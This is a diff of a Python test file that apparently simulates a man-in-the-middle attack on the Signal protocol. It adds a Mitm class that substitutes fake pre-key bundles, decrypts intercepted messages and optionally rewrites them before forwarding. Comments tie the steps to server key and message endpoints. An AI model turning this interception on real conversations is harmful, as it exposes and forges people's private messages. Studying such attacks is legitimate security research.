@@ -143,75 +143,217 @@ class MitmUser(object):
 
         return session_cipher.message_decrypt(self.store, address, ciphertext)
 
+class Mitm:
+    def __init__(self, victim: MitmUser, user:MitmUser):
+        self.fake_victim = victim
+        self.fake_user = user
 
-# Create MitmUser instances
-Alice = MitmUser(address=address.ProtocolAddress("alice", 1), RID=1)
-Bob = MitmUser(address=address.ProtocolAddress("bob", 1), RID=2)
-#print(Alice.pre_key_bundle.kyber_pre_key_id())
+        self.messages_exchange = []
 
-assert Alice.store.load_session(Bob.address) is None
+    def receive_message_from_victim(self, address: address.ProtocolAddress, ciphertext: protocol.CiphertextMessage):
+        ptxt = self.fake_user.decrypt(address, ciphertext)
+        self.messages_exchange.append([address, self.fake_victim.address, ptxt, time.ctime()])
+        return ptxt
 
-print(f"Bob's pre_key_bundle: {Bob.pre_key_bundle.to_dict()}")
+    def receive_message_from_user(self, address: address.ProtocolAddress, ciphertext: protocol.CiphertextMessage):
+        ptxt = self.fake_victim.decrypt(address, ciphertext)
+        self.messages_exchange.append([address, self.fake_user.address, ptxt, time.ctime()])
+        return ptxt
+    
+    def send_message_to_victim(self, address: address.ProtocolAddress, plaintext: bytes):
+        ciphertext = self.fake_user.encrypt(address, plaintext)
+        self.messages_exchange.append([self.fake_user.address, address, plaintext, time.ctime()])
+        return ciphertext
 
-Alice.process_pre_key_bundle(Bob.address, Bob.pre_key_bundle)
+    def send_message_to_user(self, address: address.ProtocolAddress, plaintext: bytes):
+        ciphertext = self.fake_victim.encrypt(address, plaintext)
+        self.messages_exchange.append([self.fake_victim.address, address, plaintext, time.ctime()])
+        return ciphertext
+    
+    def receive_pre_key_bundle(self, address: address.ProtocolAddress, pre_key_bundle: state.PreKeyBundle):
+        self.fake_victim.process_pre_key_bundle(address, pre_key_bundle)
+
+    def intercept_and_modifying(self, address: address.ProtocolAddress, ciphertext: protocol.CiphertextMessage):
+        if address.name() == self.fake_victim.address.name():
+            text = self.receive_message_from_victim(address, ciphertext)
+            print(f"Mitm received message from victim {text}")
+            flag = input("Do you want to send this message to the user? (y/n) ")
+            if flag == "y":
+                return self.send_message_to_user(self.fake_user.address, text)
+            if flag == "n":
+                message = bytes(input("Enter the message you want to send to the user: "), 'utf-8')
+                return self.send_message_to_user(self.fake_user.address, message)
+
+        elif address.name() == self.fake_user.address.name():
+            text = self.receive_message_from_user(address, ciphertext)
+            print(f"Mitm received message from user {text}")
+            flag = input("Do you want to send this message to the victim? (y/n) ")
+            if flag == "y":
+                return self.send_message_to_victim(self.fake_victim.address, text)
+            if flag == "n":
+                message = bytes(input("Enter the message you want to send to the user: "), 'utf-8')
+                return self.send_message_to_victim(self.fake_victim.address, message)
+
+def test_alice_to_bob():
+    # Create MitmUser instances
+    Alice = MitmUser(address=address.ProtocolAddress("alice", 1), RID=1)
+    Bob = MitmUser(address=address.ProtocolAddress("bob", 1), RID=2)
+    #print(Alice.pre_key_bundle.kyber_pre_key_id())
+
+    assert Alice.store.load_session(Bob.address) is None
+
+    print(f"Bob's pre_key_bundle: {Bob.pre_key_bundle.to_dict()}")
+
+    Alice.process_pre_key_bundle(Bob.address, Bob.pre_key_bundle)
 
 
-print(f"Session version {Alice.store.load_session(Bob.address).session_version()}")
-assert Alice.store.load_session(Bob.address).session_version() == 4
+    print(f"Session version {Alice.store.load_session(Bob.address).session_version()}")
+    assert Alice.store.load_session(Bob.address).session_version() == 4
 
-original_message = b"Hobgoblins hold themselves to high standards of military honor"
+    original_message = b"Hobgoblins hold themselves to high standards of military honor"
 
-#enc = Alice.encrypt(Bob.address, original_message).serialize()
+    #enc = Alice.encrypt(Bob.address, original_message).serialize()
 
-#BuildSignalMessage
+    #BuildSignalMessage
 
-# DataMessage
-# Content
-# SignalMessage
-# PreKeySignalMessage
+    # DataMessage
+    # Content
+    # SignalMessage
+    # PreKeySignalMessage
 
-data_message = DataMessage()
-data_message.body = b"Hello, World!"
-###### Stuff that you can get from the original message (and save the profile_key) or generate it your self 
-data_message.profileKey = b"adrianoooo"
-data_message.timestamp = current_milli_time()
+    data_message = DataMessage()
+    data_message.body = b"Hello, World!"
+    ###### Stuff that you can get from the original message (and save the profile_key) or generate it your self 
+    data_message.profileKey = b"adrianoooo"
+    data_message.timestamp = current_milli_time()
 
-content = Content()
-content.dataMessage.CopyFrom(data_message)
-serializedContent = (content.SerializeToString())
+    content = Content()
+    content.dataMessage.CopyFrom(data_message)
+    serializedContent = (content.SerializeToString())
 
-#print(f"serializedContent: {serializedContent}")
+    #print(f"serializedContent: {serializedContent}")
 
-cipher = Alice.encrypt(Bob.address, serializedContent)
-cipher_2 = Alice.encrypt(Bob.address, serializedContent)
+    cipher = Alice.encrypt(Bob.address, serializedContent)
+    cipher_2 = Alice.encrypt(Bob.address, serializedContent)
 
-print(f"cipher: {cipher.serialize().hex()}")
-print(f"cipher_2: {cipher_2.serialize().hex()}")
+    print(f"cipher: {cipher.serialize().hex()}")
+    print(f"cipher_2: {cipher_2.serialize().hex()}")
 
 
-print(cipher.serialize() == cipher_2.serialize())
+    print(cipher.serialize() == cipher_2.serialize())
 
-Bob.store.save_identity(
-    Alice.address, Alice.store.get_identity_key_pair().identity_key()
-)
+    # Bob.store.save_identity(
+    #     Alice.address, Alice.store.get_identity_key_pair().identity_key()
+    # )
 
-dec = Bob.decrypt(Alice.address, cipher)
+    dec = Bob.decrypt(Alice.address, cipher)
 
-#print(f"Bob decrypts {dec}")
+    print(f"Bob decrypts {dec}")
 
-bobs_response = b"Who watches the watchers?"
+    bobs_response = b"Who watches the watchers?"
 
-assert Bob.check_session(Alice.address)
+    assert Bob.check_session(Alice.address)
 
-bobs_session_with_alice = Bob.check_session(Alice.address)
-assert bobs_session_with_alice.session_version() == 4
-assert len(bobs_session_with_alice.alice_base_key()) == 32 + 1
+    bobs_session_with_alice = Bob.check_session(Alice.address)
+    assert bobs_session_with_alice.session_version() == 4
+    assert len(bobs_session_with_alice.alice_base_key()) == 32 + 1
 
-bob_outgoing = Bob.encrypt(Alice.address, bobs_response)
-assert bob_outgoing.message_type() == 2  # 2 == CiphertextMessageType::Whisper
+    bob_outgoing = Bob.encrypt(Alice.address, bobs_response)
+    assert bob_outgoing.message_type() == 2  # 2 == CiphertextMessageType::Whisper
 
-# Now back to fake alice
+    # Now back to fake alice
 
-alice_decrypts = Alice.decrypt(Bob.address, bob_outgoing)
-notifu(f"Alice decrypts '{alice_decrypts.decode()}'")
-assert alice_decrypts == bobs_response
+    alice_decrypts = Alice.decrypt(Bob.address, bob_outgoing)
+    notifu(f"Alice decrypts '{alice_decrypts.decode()}'")
+    assert alice_decrypts == bobs_response
+
+def test_mitm_alice_to_bob():
+
+    ####### ENDPOINT /v2/keys/
+
+    Real_Alice = MitmUser(address=address.ProtocolAddress("alice", 1), RID=1)
+    Real_Bob = MitmUser(address=address.ProtocolAddress("bob", 1), RID=2)
+
+    Fake_Bob = MitmUser(address=address.ProtocolAddress("bob", 1), RID=2)
+    Fake_Alice = MitmUser(address=address.ProtocolAddress("alice", 1), RID=1)
+    mitm = Mitm(Fake_Alice, Fake_Bob)
+
+    # Fake Alice process the pre key bundle of Bob
+    mitm.receive_pre_key_bundle(Real_Bob.address, Real_Bob.pre_key_bundle)
+
+
+    Real_Alice.process_pre_key_bundle(Fake_Bob.address, Fake_Bob.pre_key_bundle)
+
+    ###### ENDPOINT /v2/keys/ 
+
+    ####### ENDPOINT /v1/messages/ inside websocket
+
+    # Alice sends a message to Bob (Fake_Bob)
+    original_message = b"Hello, Bob!"
+    enc = Real_Alice.encrypt(Fake_Bob.address, original_message)
+
+    # Mitm intercepts the pre key bundle
+    message = mitm.intercept_and_modifying(Real_Alice.address, enc)
+
+    print(message.serialize().hex())
+
+    clear_text = Real_Bob.decrypt(Fake_Alice.address, message)
+
+    print(clear_text)
+
+    # Mitm intercepts the message
+    bob_alice_message = Real_Bob.encrypt(Fake_Alice.address, clear_text + b" fuck this")
+
+    print(bob_alice_message.serialize().hex())
+
+    dec_message = mitm.intercept_and_modifying(Real_Bob.address, bob_alice_message)
+
+    print(Real_Alice.decrypt(Fake_Bob.address, dec_message))
+
+    # # Mitm sends his own pre key bundle to Bob
+    # Mitm.process_pre_key_bundle(Bob.address, Mitm.pre_key_bundle)
+
+    # # Bob receives Mitm's pre key bundle
+    # Bob.process_pre_key_bundle(Mitm.address, Mitm.pre_key_bundle)
+
+    # # Bob receives Alice's pre key bundle
+    # Bob.process_pre_key_bundle(Alice.address, Alice.pre_key_bundle)
+
+    # # Alice sends a message to Bob
+    # original_message = b"Hello, Bob!"
+    # enc = Alice.encrypt(Bob.address, original_message)
+
+    # # Mitm intercepts the message
+    # dec = Mitm.decrypt(Bob.address, enc)
+
+    # notifu(f"Mitm intercepts '{dec.decode()}'")
+
+    # # Bob receives the message
+    # dec = Bob.decrypt(Alice.address, enc)
+
+    # notifu(f"Bob decrypts '{dec.decode()}'")
+
+    # assert dec == original_message
+
+def test_mitm_bob_to_alice():
+    Real_Alice = MitmUser(address=address.ProtocolAddress("alice", 1), RID=1)
+    Real_Bob = MitmUser(address=address.ProtocolAddress("bob", 1), RID=2)
+
+    Fake_Bob = MitmUser(address=address.ProtocolAddress("bob", 1), RID=2)
+    Fake_Alice = MitmUser(address=address.ProtocolAddress("alice", 1), RID=1)
+    mitm = Mitm(Fake_Alice, Fake_Bob)
+
+    Fake_Bob.process_pre_key_bundle(Real_Alice.address, Real_Alice.pre_key_bundle)
+
+    Real_Bob.process_pre_key_bundle(Fake_Alice.address, Fake_Alice.pre_key_bundle)
+    bob_ctx = Real_Bob.encrypt(Fake_Alice.address, b"Hello, Alice!")
+
+    # Alice process the pre key bundle of Bob
+    msg = mitm.intercept_and_modifying(Real_Bob.address, bob_ctx)
+
+    print(Real_Alice.decrypt(Fake_Bob.address, msg))
+
+    print(mitm.messages_exchange)
+
+
+test_mitm_bob_to_alice()
